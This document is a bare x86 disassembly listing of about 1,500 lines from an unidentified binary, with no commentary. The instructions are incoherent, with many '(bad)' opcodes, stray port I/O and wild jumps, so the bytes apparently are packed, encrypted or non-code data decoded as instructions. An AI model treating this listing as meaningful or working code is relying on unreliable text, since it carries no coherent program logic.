  406726:	scas   eax,DWORD PTR es:[edi]
  406727:	pop    ebp
  406728:	out    0xd4,eax
  40672a:	pop    esi
  40672b:	iret   
  40672c:	dec    edx
  40672d:	rol    BYTE PTR [eax+0x77d853aa],1
  406733:	cwde   
  406734:	jno    0x406719
  406736:	or     DWORD PTR [eax-0xe],eax
  406739:	and    esp,DWORD PTR [ecx+0x2c]
  40673c:	loop   0x406709
  40673e:	pusha  
  40673f:	jecxz  0x4066e9
  406741:	shr    DWORD PTR ds:0xf06322ef,1
  406747:	test   DWORD PTR [ecx],ebp
  406749:	mov    ecx,0x4a896642
  40674e:	loope  0x40679b
  406750:	xchg   edi,eax
  406751:	les    ebp,FWORD PTR ss:[ecx+0x56]
  406755:	mov    ds:0x64ff2e61,eax
  40675a:	inc    edi
  40675b:	push   esp
  40675c:	adc    cl,BYTE PTR [ebp+0x7502aa06]
  406762:	pop    ebx
  406763:	jmp    DWORD PTR [esi-0xe]
  406766:	sar    BYTE PTR [edi],0x63
  406769:	jnp    0x4067c2
  40676b:	sbb    BYTE PTR [edi+0x88f7690],al
  406771:	pusha  
  406772:	jl     0x4066fc
  406774:	xlat   BYTE PTR ds:[ebx]
  406775:	mov    dl,0xf2
  406777:	push   ebx
  406778:	sbb    ebx,ecx
  40677a:	dec    ebp
  40677b:	jo     0x40670d
  40677d:	pop    eax
  40677e:	dec    eax
  40677f:	cdq    
  406780:	add    al,0x6e
  406782:	(bad)  
  406783:	lock in al,dx
  406785:	cld    
  406786:	inc    ebp
  406787:	imul   edx,edx,0x29b8e5aa
  40678d:	stos   DWORD PTR es:[edi],eax
  40678e:	add    DWORD PTR [eax+0x1a3dd67b],edx
  406794:	sbb    ebp,DWORD PTR [ebp-0x4c]
  406797:	cmp    eax,0x65e78a06
  40679c:	inc    ecx
  40679d:	or     bh,BYTE PTR [edx+0x2c]
  4067a0:	sub    esi,esi
  4067a2:	push   esp
  4067a3:	in     eax,0x15
  4067a5:	test   eax,0x4bb23fae
  4067aa:	js     0x406793
  4067ac:	(bad)  [ecx+ebp*4+0x6be2e653]
  4067b3:	repnz push 0x5eaf0ed8
  4067b9:	xor    al,0x25
  4067bb:	pop    ebp
  4067bc:	sar    BYTE PTR [ebx],0x39
  4067bf:	sbb    cl,ch
  4067c1:	jo     0x40675c
  4067c3:	push   ss
  4067c4:	out    0xc5,al
  4067c6:	mov    ch,0x22
  4067c8:	stos   BYTE PTR es:[edi],al
  4067c9:	inc    edi
  4067ca:	cs sub eax,0xbf57e866
  4067d0:	and    BYTE PTR [ecx+edi*2+0x4e52fdcf],ah
  4067d7:	imul   ebx,DWORD PTR [ebx],0xffffff88
  4067da:	ret    0xae1f
  4067dd:	ret    
  4067de:	lods   al,BYTE PTR ds:[esi]
  4067df:	rol    DWORD PTR [eax-0x74e9c7a1],0xe0
  4067e6:	sbb    bh,BYTE PTR [ebp-0x2ce5de91]
  4067ec:	mov    ah,0xcf
  4067ee:	add    al,0xf2
  4067f0:	push   es
  4067f1:	(bad)  
  4067f2:	pop    eax
  4067f3:	div    BYTE PTR [eax+0x5f]
  4067f6:	push   ds
  4067f7:	mov    WORD PTR [edx],ds
  4067f9:	pusha  
  4067fa:	and    DWORD PTR [ebx+0x36],edx
  4067fd:	sub    dl,BYTE PTR [eax]
  4067ff:	dec    edx
  406800:	sar    BYTE PTR [esi+ecx*2-0x71e2ee7b],0xb1
  406808:	jp     0x406813
  40680a:	lea    ecx,[edx+0xd]
  40680d:	(bad)  
  40680f:	mul    BYTE PTR [edi-0x760a9147]
  406815:	and    eax,0x35d368ec
  40681a:	int3   
  40681b:	adc    eax,0x6da28394
  406820:	fist   WORD PTR [edi+edi*8-0x172f33c2]
  406827:	jge    0x40686f
  406829:	xor    BYTE PTR [ebp+edx*8+0x14a13fcc],bl
  406830:	ins    BYTE PTR es:[edi],dx
  406831:	push   edx
  406832:	cmp    bh,cl
  406834:	sar    DWORD PTR [ebp-0x61],cl
  406837:	mov    DWORD PTR [esi],edi
  406839:	fs fstp st(3)
  40683c:	rol    ebx,1
  40683e:	scas   eax,DWORD PTR es:[edi]
  40683f:	mov    al,0x22
  406841:	dec    eax
  406842:	ins    DWORD PTR es:[edi],dx
  406843:	mov    BYTE PTR [ecx],ch
  406845:	data16 cli 
  406847:	dec    ebp
  406848:	mov    ch,0xe4
  40684a:	in     al,0xe2
  40684c:	fldcw  WORD PTR [ecx]
  40684e:	push   esp
  40684f:	(bad)  
  406851:	adc    BYTE PTR [eax],0x96
  406854:	xchg   al,dh
  406856:	inc    edi
  406857:	dec    edx
  406858:	aad    0xcd
  40685a:	ins    BYTE PTR es:[edi],dx
  40685b:	inc    ecx
  40685c:	xor    DWORD PTR [esi-0x1fbd9b73],ebx
  406862:	fmul   st(3),st
  406864:	sbb    DWORD PTR [esi],ebx
  406866:	push   0x5fe0a742
  40686b:	mov    ecx,0x8fbf1c19
  406870:	xchg   edi,eax
  406871:	jmp    0x406812
  406873:	das    
  406874:	xor    bl,BYTE PTR [edi-0x4]
  406877:	cmp    ebp,DWORD PTR [esi*8-0x69ceba1f]
  40687e:	mov    bl,0x49
  406880:	sbb    DWORD PTR [ecx+0x6a],ebx
  406883:	xchg   BYTE PTR [eax],cl
  406885:	(bad)  
  406886:	cli    
  406887:	pop    edi
  406888:	mov    WORD PTR fs:[ecx+0x13],ds
  40688c:	inc    ecx
  40688d:	iret   
  40688e:	jmp    0x5a15:0x7e5f517
  406895:	jns    0x4068c3
  406897:	xchg   edi,eax
  406898:	push   esp
  406899:	xchg   edi,esp
  40689b:	aam    0xc4
  40689d:	(bad)  
  40689e:	(bad)  
  4068a0:	arpl   WORD PTR [ecx],ax
  4068a2:	fild   DWORD PTR ss:[edi+0x45d1cdcd]
  4068a9:	xchg   esi,eax
  4068aa:	or     bl,dh
  4068ac:	xor    al,BYTE PTR [esi]
  4068ae:	fwait
  4068af:	in     eax,0x37
  4068b1:	pop    edx
  4068b2:	(bad)  
  4068b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068b4:	fs into 
  4068b6:	js     0x406869
  4068b8:	sbb    eax,0x76a8a50d
  4068bd:	dec    eax
  4068be:	clc    
  4068bf:	ret    
  4068c0:	sub    edx,DWORD PTR [esi]
  4068c2:	call   FWORD PTR [eax+0x30]
  4068c5:	call   0x46ac0835
  4068ca:	mov    ch,bh
  4068cc:	repnz xor DWORD PTR [ebx+esi*4],edx
  4068d0:	xor    BYTE PTR [edx+eax*1+0x17],dl
  4068d4:	inc    esp
  4068d5:	adc    DWORD PTR [edx+eax*4+0x26],esi
  4068d9:	inc    eax
  4068da:	jmp    0xddab32d5
  4068df:	call   0x3235f0e
  4068e4:	xor    esi,edi
  4068e6:	sti    
  4068e7:	jno    0x406933
  4068e9:	out    0x99,al
  4068eb:	fucom  st(1)
  4068ed:	xchg   DWORD PTR [ebx],esp
  4068ef:	or     edx,DWORD PTR [ebx+0x53]
  4068f2:	fistp  QWORD PTR gs:[ebx+0xf]
  4068f6:	dec    esi
  4068f7:	jne    0x4068b5
  4068f9:	js     0x4068ba
  4068fb:	and    edi,ecx
  4068fd:	mov    eax,ds:0xf1701e30
  406902:	je     0x40688d
  406904:	dec    esi
  406905:	imul   BYTE PTR [esi+eiz*4]
  406908:	repnz retf 0x3a95
  40690c:	out    0x5e,al
  40690e:	and    DWORD PTR [edx+0x24],edx
  406911:	or     al,0x4f
  406913:	fsubr  QWORD PTR [esi+ebp*1+0x0]
  406917:	xor    DWORD PTR [edx],0xc8413f72
  40691d:	out    0x95,eax
  40691f:	inc    edi
  406920:	ins    DWORD PTR es:[edi],dx
  406921:	shr    BYTE PTR [edx-0x70],1
  406924:	outs   dx,BYTE PTR ds:[esi]
  406925:	mov    ecx,DWORD PTR [esi]
  406927:	test   BYTE PTR [ecx+0x7341a813],dh
  40692d:	imul   BYTE PTR gs:[eax+0x1d]
  406931:	mov    ebx,0x267295c9
  406936:	neg    DWORD PTR [edx+esi*1-0x52]
  40693a:	inc    esi
  40693b:	or     BYTE PTR [edi+0x5d47e4b3],0x43
  406942:	push   eax
  406943:	in     al,0xdf
  406945:	mov    gs,ebp
  406947:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406949:	push   ds
  40694a:	loop   0x4068e6
  40694c:	xor    DWORD PTR [edi+eax*2-0x1e8636aa],edi
  406953:	adc    eax,0xf3fe5b13
  406958:	mov    cl,0xf7
  40695a:	adc    al,0xd3
  40695c:	xchg   esp,eax
  40695d:	ins    DWORD PTR es:[edi],dx
  40695e:	push   edi
  40695f:	jecxz  0x4069d6
  406961:	and    BYTE PTR [ecx+ebx*1-0x30b39624],cl
  406968:	mov    bh,0xb6
  40696a:	mov    ah,0x4e
  40696c:	mov    ecx,0x9278118c
  406971:	mov    ecx,0xcd5da448
  406976:	pop    edx
  406977:	xchg   DWORD PTR [esi-0x5e5740fc],edx
  40697d:	or     al,0x42
  40697f:	or     ah,cl
  406981:	cs pop es
  406983:	or     eax,0xed2a1181
  406988:	js     0x406957
  40698a:	fsubr  QWORD PTR [edi]
  40698c:	mov    edi,0x9222c116
  406991:	mov    ah,0x98
  406993:	pop    edx
  406994:	push   ebp
  406995:	sar    BYTE PTR [esi+0x6db92310],cl
  40699b:	push   edx
  40699c:	fstp   st(7)
  40699e:	inc    edx
  40699f:	int3   
  4069a0:	lea    ecx,[ecx-0x71339df1]
  4069a6:	mov    ch,0x55
  4069a8:	adc    DWORD PTR [ecx+0x57],edi
  4069ab:	push   es
  4069ac:	rol    cl,0x36
  4069af:	into   
  4069b0:	pop    ebp
  4069b1:	lea    esi,[ecx+0x3ded5e37]
  4069b7:	fdiv   QWORD PTR [ebp+0x4bd6f54e]
  4069bd:	retf   
  4069be:	push   ecx
  4069bf:	mov    ?,WORD PTR [edx]
  4069c1:	hlt    
  4069c2:	mov    DWORD PTR [edi+0x13],ecx
  4069c5:	mov    edx,0x5ae757f6
  4069ca:	and    al,0x88
  4069cc:	data16 aaa 
  4069ce:	xor    al,0x49
  4069d0:	and    esi,DWORD PTR [edi+0x5962e234]
  4069d6:	fsub   st,st(7)
  4069d8:	adc    DWORD PTR [ebx],0xbce0358
  4069de:	cld    
  4069df:	or     bl,bl
  4069e1:	xchg   ecx,eax
  4069e2:	mov    bh,0xe
  4069e4:	or     dl,BYTE PTR [bx-0x7f61]
  4069e9:	push   ecx
  4069ea:	pop    ecx
  4069eb:	pop    es
  4069ec:	and    cl,BYTE PTR [esi]
  4069ee:	fnstenv [edx-0x14199b90]
  4069f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069f5:	sub    ah,0x8a
  4069f8:	and    BYTE PTR [edx-0x43100f6e],ah
  4069fe:	and    eax,0x88a68d7d
  406a03:	aas    
  406a04:	popf   
  406a05:	xor    al,0x80
  406a07:	push   ebp
  406a08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a09:	ss add eax,0xe230fbee
  406a0f:	sbb    eax,0x87d15b3b
  406a14:	jmp    0x3c677a86
  406a19:	mov    ebp,0x82ebd17
  406a1e:	mov    ds:0x7f8ff479,eax
  406a23:	mov    dl,0x11
  406a25:	es ds xor al,0x14
  406a29:	add    DWORD PTR [eax+0x73],ecx
  406a2c:	fst    DWORD PTR [ebx-0x2b]
  406a2f:	test   eax,0xbe2c5105
  406a34:	pop    ecx
  406a35:	xor    al,0xf
  406a37:	and    bh,BYTE PTR [edi+0x52452531]
  406a3d:	xor    eax,0xd407809c
  406a42:	outs   dx,WORD PTR ds:[esi]
  406a44:	xor    DWORD PTR [ebx-0xcc73e98],0x38
  406a4b:	cmp    DWORD PTR ds:0x497b2a5a,edx
  406a51:	hlt    
  406a52:	mov    esi,0xbd064767
  406a57:	outs   dx,DWORD PTR ds:[esi]
  406a58:	fimul  WORD PTR ds:0x8909ee2f
  406a5e:	fstp   TBYTE PTR [eax+0xd]
  406a61:	jno    0x4069f8
  406a63:	pop    ebp
  406a64:	scas   eax,DWORD PTR es:[edi]
  406a65:	in     eax,dx
  406a66:	push   eax
  406a67:	inc    esp
  406a68:	adc    DWORD PTR [edx-0x377d785c],esp
  406a6e:	mov    eax,ds:0x650dd171
  406a73:	daa    
  406a74:	adc    cl,BYTE PTR [ebp+0x18]
  406a77:	dec    edx
  406a78:	xor    dh,cl
  406a7a:	or     al,dl
  406a7c:	into   
  406a7d:	xor    DWORD PTR [ecx],ecx
  406a7f:	push   ecx
  406a80:	xchg   BYTE PTR [ebx],bh
  406a82:	(bad)  
  406a83:	fstp   DWORD PTR [eax-0x22]
  406a86:	loope  0x406a24
  406a88:	xchg   esp,eax
  406a89:	push   ecx
  406a8a:	(bad)  
  406a8b:	and    eax,0x3a9ec6cc
  406a90:	dec    edi
  406a91:	neg    ebx
  406a93:	mov    edx,0xcc954af6
  406a98:	rcr    DWORD PTR [eax+ebx*1-0x657ab6e9],0x98
  406aa0:	aad    0x45
  406aa2:	aad    0x41
  406aa4:	popf   
  406aa5:	cmc    
  406aa6:	mov    ebp,0xb6a605db
  406aab:	pop    ebp
  406aac:	jne    0x406a46
  406aae:	mov    ah,0xf2
  406ab0:	add    esp,DWORD PTR [edx]
  406ab2:	out    0x7a,eax
  406ab4:	adc    al,0x9e
  406ab6:	and    eax,0xcdc81bc0
  406abb:	inc    eax
  406abc:	add    edx,edx
  406abe:	and    DWORD PTR [edx+0x12702021],edi
  406ac4:	icebp  
  406ac5:	pop    es
  406ac6:	fistp  QWORD PTR [edx+0x6]
  406ac9:	test   al,0x84
  406acb:	adc    ebx,edx
  406acd:	bound  ebp,QWORD PTR [edi+esi*8]
  406ad0:	mov    edx,DWORD PTR [ecx+0x60]
  406ad3:	cmp    BYTE PTR [esi+0x40],al
  406ad6:	pop    esp
  406ad7:	fstp   st(3)
  406ad9:	inc    ebp
  406ada:	xor    BYTE PTR [ebx+edx*1+0x10c565f0],dh
  406ae1:	xchg   edi,eax
  406ae2:	or     DWORD PTR [edi+0xcab79c3],0xfffffffb
  406ae9:	(bad)  
  406aea:	dec    ebp
  406aeb:	dec    eax
  406aec:	repz fdivr st(6),st
  406aef:	lods   al,BYTE PTR ds:[esi]
  406af0:	hlt    
  406af1:	cwde   
  406af2:	int    0xe
  406af4:	adc    BYTE PTR [eax],cl
  406af6:	sbb    esi,DWORD PTR [edi+0x12]
  406af9:	(bad)  
  406afa:	sub    eax,0xbfa2ed9f
  406aff:	mov    edx,0xe537fbd8
  406b04:	shl    BYTE PTR [ebx],1
  406b06:	(bad)  
  406b07:	call   0x39a3:0x75c7ba54
  406b0e:	mov    eax,0x32f4cf5e
  406b13:	xchg   esi,eax
  406b14:	data16 std 
  406b16:	test   al,0x27
  406b18:	sbb    eax,0x31c7013c
  406b1d:	repnz mov bh,0xc4
  406b20:	dec    esp
  406b21:	xor    ebx,ebx
  406b23:	iret   
  406b24:	aad    0xd7
  406b26:	pop    ebx
  406b27:	sbb    al,0x3a
  406b29:	rcl    DWORD PTR [esi+0x285ec2b2],cl
  406b2f:	xchg   ebp,eax
  406b30:	ins    BYTE PTR es:[edi],dx
  406b31:	int3   
  406b32:	pop    DWORD PTR fs:[ebx-0x34ba18a9]
  406b39:	mov    ah,0xe9
  406b3b:	outs   dx,DWORD PTR ds:[esi]
  406b3c:	nop
  406b3d:	out    dx,al
  406b3e:	jecxz  0x406ad6
  406b40:	jno    0x406af8
  406b42:	xor    DWORD PTR [eax+0x536f665f],0xffffffeb
  406b49:	xchg   ebp,eax
  406b4a:	sub    dl,BYTE PTR [ecx+0x48]
  406b4d:	mov    edx,0xd1fd12c4
  406b52:	arpl   WORD PTR [edx],dx
  406b54:	xchg   esp,eax
  406b55:	ret    0x2497
  406b58:	pusha  
  406b59:	and    DWORD PTR [ecx],ecx
  406b5b:	add    eax,0x6f365b51
  406b60:	in     al,0x2c
  406b62:	pop    esi
  406b63:	push   edx
  406b64:	mov    ebx,0xad97d55a
  406b69:	js     0x406b4d
  406b6b:	repnz mov ds:0xfe7753b,al
  406b71:	sub    eax,0xf0db3eb1
  406b76:	and    DWORD PTR [esi],ecx
  406b78:	add    DWORD PTR [ebx+0x3e],0xffffff99
  406b7c:	jne    0x406b4f
  406b7e:	loopne 0x406b14
  406b80:	and    esi,eax
  406b82:	add    ch,BYTE PTR ds:0x5fa9d1cc
  406b88:	push   ecx
  406b89:	jmp    0x59df1fde
  406b8e:	fist   WORD PTR [edx+0x22f92ab7]
  406b94:	xor    edx,esi
  406b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b97:	rcl    ch,cl
  406b99:	sbb    eax,DWORD PTR [ecx]
  406b9b:	shl    BYTE PTR [esi-0x5f3aaa7a],0x4e
  406ba2:	stos   DWORD PTR es:[edi],eax
  406ba3:	cmc    
  406ba4:	jo     0x406b99
  406ba6:	xor    BYTE PTR [edx-0x66],ah
  406ba9:	fstp   DWORD PTR [esp+ecx*4]
  406bac:	mov    BYTE PTR [eax-0x74],dh
  406baf:	push   ss
  406bb0:	push   0x5b
  406bb2:	loopne 0x406c2b
  406bb4:	aam    0xd0
  406bb6:	xchg   ecx,eax
  406bb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bb8:	cmp    dh,BYTE PTR [edi]
  406bba:	(bad)  
  406bbc:	xor    al,0xac
  406bbe:	push   cs
  406bbf:	jmp    0x738184d9
  406bc4:	popf   
  406bc5:	fsub   st,st(6)
  406bc7:	or     al,0x84
  406bc9:	out    dx,al
  406bca:	bsr    ebx,edi
  406bcd:	pop    eax
  406bce:	fwait
  406bcf:	xchg   edx,eax
  406bd0:	ds jmp 0x73f:0xac6c4014
  406bd8:	sub    ebp,DWORD PTR [ebx+0x566b50d]
  406bde:	dec    ebx
  406bdf:	cli    
  406be0:	fnstenv ss:[ecx-0x7f]
  406be4:	cmp    BYTE PTR [ecx],dh
  406be6:	and    edi,DWORD PTR [ebx+0x35]
  406be9:	into   
  406bea:	sub    DWORD PTR [edi+0x34dd1478],edx
  406bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bf1:	fninit 
  406bf3:	add    eax,0x4ff2d33b
  406bf8:	cli    
  406bf9:	and    edx,DWORD PTR [ecx-0x44]
  406bfc:	shl    BYTE PTR [esp+eiz*4-0x2b9cc47],1
  406c03:	inc    esi
  406c04:	jnp    0x406c7d
  406c06:	fwait
  406c07:	ds call 0xd633650d
  406c0d:	pop    esi
  406c0e:	pop    edi
  406c0f:	loop   0x406bab
  406c11:	or     DWORD PTR [edi+0x3],ebp
  406c14:	in     al,dx
  406c15:	out    0x6b,eax
  406c17:	int    0x54
  406c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c1a:	add    bh,ch
  406c1c:	or     BYTE PTR [ebp-0x31c9c15],bh
  406c22:	adc    al,0x7a
  406c24:	fs ss inc esp
  406c27:	jbe    0x406c2a
  406c29:	stc    
  406c2a:	jnp    0x406c9f
  406c2c:	es xchg ecx,eax
  406c2e:	in     al,dx
  406c2f:	xor    DWORD PTR [esi],ebx
  406c31:	ret    
  406c32:	xor    ebx,DWORD PTR [ebx+0x3d]
  406c35:	push   cs
  406c36:	mov    BYTE PTR [edi+0x3af4d188],cl
  406c3c:	(bad)  [ebp+0x67]
  406c3f:	loope  0x406c8a
  406c41:	sbb    BYTE PTR [eax],al
  406c43:	cmp    edi,esi
  406c45:	scas   eax,DWORD PTR es:[edi]
  406c46:	inc    edi
  406c47:	dec    edx
  406c48:	dec    edi
  406c49:	aam    0x60
  406c4b:	(bad)  
  406c4c:	xchg   ebx,eax
  406c4d:	add    cl,BYTE PTR [ecx-0x4aa97b51]
  406c53:	lods   al,BYTE PTR ds:[esi]
  406c54:	mov    es,WORD PTR [eax]
  406c56:	add    al,BYTE PTR [ebx]
  406c58:	jns    0x406c3c
  406c5a:	push   0x87b92ed9
  406c5f:	scas   al,BYTE PTR es:[edi]
  406c60:	pop    ecx
  406c61:	mov    eax,ds:0x2bfc6554
  406c66:	cdq    
  406c67:	rol    BYTE PTR [ecx-0x15],cl
  406c6a:	mov    ds:0xb82b3ed6,al
  406c6f:	jo     0x406c05
  406c71:	and    DWORD PTR ds:0x4cb1d4c8,edx
  406c77:	or     DWORD PTR [edx],ebp
  406c79:	xlat   BYTE PTR ds:[ebx]
  406c7a:	(bad)  
  406c7b:	xchg   ecx,eax
  406c7c:	and    eax,DWORD PTR [ecx+0x2c]
  406c7f:	dec    edx
  406c80:	lods   al,BYTE PTR ds:[esi]
  406c81:	cmp    BYTE PTR [esi-0x40],0x79
  406c85:	mov    cl,0x2f
  406c87:	push   ss
  406c88:	or     bh,0xe3
  406c8b:	dec    ebp
  406c8c:	in     eax,0xb2
  406c8e:	and    edx,DWORD PTR [edx-0x61]
  406c91:	push   cs
  406c92:	push   cs
  406c93:	aam    0xc2
  406c95:	add    DWORD PTR [esi-0x5b],edi
  406c98:	jmp    0x406c52
  406c9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c9b:	bound  ecx,QWORD PTR [edx-0x8eed093]
  406ca1:	sub    BYTE PTR [edi-0x36],0xa5
  406ca5:	sbb    DWORD PTR [eax+0x10],ebx
  406ca8:	push   0xa894a988
  406cad:	inc    edx
  406cae:	fwait
  406caf:	dec    esp
  406cb0:	lahf   
  406cb1:	jmp    0x406cd8
  406cb3:	sub    dh,dh
  406cb5:	push   edi
  406cb6:	pusha  
  406cb7:	and    al,0xc9
  406cb9:	test   eax,0x317d2c5c
  406cbe:	sub    BYTE PTR [edi+edi*4+0x78],ah
  406cc2:	push   eax
  406cc3:	pop    ebx
  406cc4:	push   0xffffffbb
  406cc6:	lea    edx,ds:0x87ab9451
  406ccc:	mov    ah,0x3c
  406cce:	ret    
  406ccf:	sti    
  406cd0:	dec    ebx
  406cd1:	xor    BYTE PTR [ebx+0x32aa45df],dh
  406cd7:	push   0x39
  406cd9:	fmul   DWORD PTR [eax-0x2c3a768d]
  406cdf:	leave  
  406ce0:	jmp    0x87d2982d
  406ce5:	jmp    0x4aa05d8e
  406cea:	(bad)  
  406ceb:	retf   
  406cec:	add    dl,BYTE PTR [ebx]
  406cee:	adc    BYTE PTR [eax-0x1e],0x68
  406cf2:	shl    BYTE PTR [ebx+0x5dfc8429],cl
  406cf8:	mov    dh,BYTE PTR [esp+esi*8]
  406cfb:	pop    esi
  406cfc:	cld    
  406cfd:	pop    edi
  406cfe:	lds    eax,FWORD PTR [ebx+0x7c890d25]
  406d04:	mov    dl,0x26
  406d06:	or     BYTE PTR [esi+0x6],ch
  406d09:	dec    ebx
  406d0a:	or     BYTE PTR [esi+0x45d3488d],bh
  406d10:	test   dh,0x80
  406d13:	or     al,0x92
  406d15:	gs xchg ebp,eax
  406d17:	fwait
  406d18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d19:	movsx  ebx,WORD PTR [eax+0x40]
  406d1d:	push   es
  406d1e:	add    esp,edi
  406d20:	pop    edi
  406d21:	xchg   DWORD PTR [ebx],ecx
  406d23:	cmp    DWORD PTR [ecx],eax
  406d25:	jnp    0x406cb7
  406d27:	sub    al,0x7f
  406d29:	out    0x55,eax
  406d2b:	inc    esi
  406d2c:	fld    DWORD PTR [esi+eiz*2+0x4d]
  406d30:	push   esi
  406d31:	dec    esp
  406d32:	scas   eax,DWORD PTR es:[edi]
  406d33:	ds jne 0x406cd0
  406d36:	jle    0x406d7d
  406d38:	icebp  
  406d39:	test   eax,0xc5b2d7ef
  406d3e:	rcl    DWORD PTR [eax],0xe
  406d41:	xchg   ebx,eax
  406d42:	and    ah,BYTE PTR [ecx]
  406d44:	je     0x406d99
  406d46:	mov    edi,0xbf5ec957
  406d4b:	stos   DWORD PTR es:[edi],eax
  406d4c:	fiadd  WORD PTR ds:0xbd157faa
  406d52:	sub    al,0xec
  406d54:	das    
  406d55:	loop   0x406d19
  406d57:	xchg   BYTE PTR [eax],dh
  406d59:	in     al,0x75
  406d5b:	jecxz  0x406d85
  406d5d:	sub    al,0xbb
  406d5f:	mov    ebp,0x78a29205
  406d64:	imul   eax,edi,0x4b
  406d67:	daa    
  406d68:	cmp    BYTE PTR [edi+edi*4+0x7c265591],dl
  406d6f:	push   edx
  406d70:	ss lock lahf 
  406d73:	fiadd  WORD PTR [eax+0x30321ea]
  406d79:	enter  0x7f23,0x93
  406d7d:	mov    al,BYTE PTR [edi]
  406d7f:	xor    eax,0x21f2ba1b
  406d84:	lods   al,BYTE PTR ds:[esi]
  406d85:	dec    eax
  406d86:	int    0xb0
  406d88:	or     dl,BYTE PTR [ecx]
  406d8a:	fstp   st(2)
  406d8c:	arpl   WORD PTR [ecx-0x16c5885],bx
  406d92:	mov    ecx,cs
  406d94:	mov    edi,0xa116dcbf
  406d99:	dec    edi
  406d9a:	add    eax,0x547cdc06
  406d9f:	xor    cl,BYTE PTR [ecx+eiz*8-0x7a]
  406da3:	mov    dh,0xf7
  406da5:	out    dx,eax
  406da6:	sub    cl,BYTE PTR [ecx]
  406da8:	xlat   BYTE PTR ds:[ebx]
  406da9:	jecxz  0x406dcc
  406dab:	pop    esp
  406dac:	ret    0xc98c
  406daf:	ds retf 
  406db1:	add    cl,BYTE PTR [esi+0x1d]
  406db4:	mov    edi,0x3ed7493
  406db9:	pop    ecx
  406dba:	push   es
  406dbb:	sbb    BYTE PTR [esp+ebp*4],bl
  406dbe:	ins    DWORD PTR es:[edi],dx
  406dbf:	repnz daa 
  406dc1:	inc    ebx
  406dc2:	lea    edx,[edx-0x18]
  406dc5:	aaa    
  406dc6:	cmp    esp,0x3b3d0af8
  406dcc:	adc    eax,0xe193cc6a
  406dd1:	push   ds
  406dd2:	ins    BYTE PTR es:[edi],dx
  406dd3:	fsub   DWORD PTR [ebx-0x7380aa73]
  406dd9:	sub    eax,DWORD PTR [ebx]
  406ddb:	ror    edi,cl
  406ddd:	dec    edx
  406dde:	iret   
  406ddf:	data16 jmp 0x406df9
  406de2:	xchg   DWORD PTR [edx+0x772ac427],ebx
  406de8:	mov    eax,ds:0x47df5ca
  406ded:	jne    0x406e02
  406def:	(bad)  
  406df0:	cmp    dh,ch
  406df2:	xor    ah,BYTE PTR [edi+0x2d7e126c]
  406df8:	pop    esp
  406df9:	xor    edi,edx
  406dfb:	add    al,0xe1
  406dfd:	fisttp WORD PTR [edi]
  406dff:	and    BYTE PTR ds:0xa1c9b5f0,0xa3
  406e06:	push   cs
  406e07:	pusha  
  406e08:	imul   ebx,DWORD PTR ds:0x9fbf443d,0x952b4f51
  406e12:	mov    ch,0xcd
  406e14:	pop    edi
  406e15:	cdq    
  406e16:	(bad)  
  406e17:	mov    ebp,0x44642d14
  406e1c:	out    dx,al
  406e1d:	push   edi
  406e1e:	mov    ch,0xe3
  406e20:	sub    DWORD PTR [edx],edx
  406e22:	bound  ebp,QWORD PTR [eax-0x4d]
  406e25:	sar    cl,0x69
  406e28:	and    eax,0xc23c1891
  406e2d:	inc    ebx
  406e2e:	inc    edi
  406e2f:	sub    ah,BYTE PTR [eax]
  406e31:	and    al,0x29
  406e33:	rol    DWORD PTR [edi+eiz*1],0x3
  406e37:	xchg   esi,eax
  406e38:	push   0xdb38693f
  406e3d:	and    BYTE PTR [edi+0x1b8870f3],bl
  406e43:	xchg   edi,eax
  406e44:	cmp    esi,edi
  406e46:	sbb    DWORD PTR [ecx],edx
  406e48:	popf   
  406e49:	loope  0x406e5a
  406e4b:	jge    0x406e4f
  406e4d:	lahf   
  406e4e:	xchg   ebx,eax
  406e4f:	lods   eax,DWORD PTR ds:[esi]
  406e50:	sbb    ch,cl
  406e52:	or     ecx,DWORD PTR [edx]
  406e54:	pop    ecx
  406e55:	jge    0x406ded
  406e57:	mov    al,ds:0x983b2998
  406e5c:	pop    esi
  406e5d:	jmp    FWORD PTR [esp+edx*1+0xc3ca1b8]
  406e64:	les    edi,FWORD PTR [esi+0x38ea6b8d]
  406e6a:	mov    cl,BYTE PTR [edi+0x77fa790d]
  406e70:	aas    
  406e71:	scas   al,BYTE PTR es:[edi]
  406e72:	sbb    edx,DWORD PTR [esi]
  406e74:	xor    al,0x68
  406e76:	inc    esp
  406e77:	scas   eax,DWORD PTR es:[edi]
  406e78:	repz in eax,dx
  406e7a:	cmp    bh,bl
  406e7c:	hlt    
  406e7d:	xchg   ebp,eax
  406e7e:	pop    esi
  406e7f:	push   ebx
  406e80:	dec    esi
  406e81:	or     al,0xcd
  406e83:	ror    BYTE PTR [ebp-0xd2b136b],cl
  406e89:	sahf   
  406e8a:	jge    0x406e1f
  406e8c:	std    
  406e8d:	cmp    eax,0x4e319557
  406e92:	push   0x83693fe9
  406e97:	test   al,0x34
  406e99:	imul   esi,DWORD PTR [eax-0x9a179cc],0xfffffff0
  406ea0:	or     bl,BYTE PTR [eax+0x2f7e8cbf]
  406ea6:	dec    edx
  406ea7:	inc    ecx
  406ea9:	jmp    0xb258cfd5
  406eae:	and    al,0xfb
  406eb0:	jmp    0x406f07
  406eb2:	inc    edx
  406eb3:	stc    
  406eb4:	pop    edi
  406eb5:	call   DWORD PTR [edi]
  406eb7:	repz pop esp
  406eb9:	jp     0x406e7a
  406ebb:	pop    edi
  406ebc:	gs cmp dh,bh
  406ebf:	jno    0x406eee
  406ec1:	dec    ebx
  406ec2:	sahf   
  406ec3:	retf   
  406ec4:	push   edi
  406ec5:	cmc    
  406ec6:	inc    edi
  406ec7:	fs push es
  406ec9:	mov    eax,0xe7647f81
  406ece:	lock sub bh,BYTE PTR [edi+0x31]
  406ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ed3:	mov    ecx,0x42509a4c
  406ed8:	pop    eax
  406ed9:	cmp    BYTE PTR [edx-0x63e2f8d2],0x4b
  406ee0:	push   DWORD PTR ds:0xb2300713
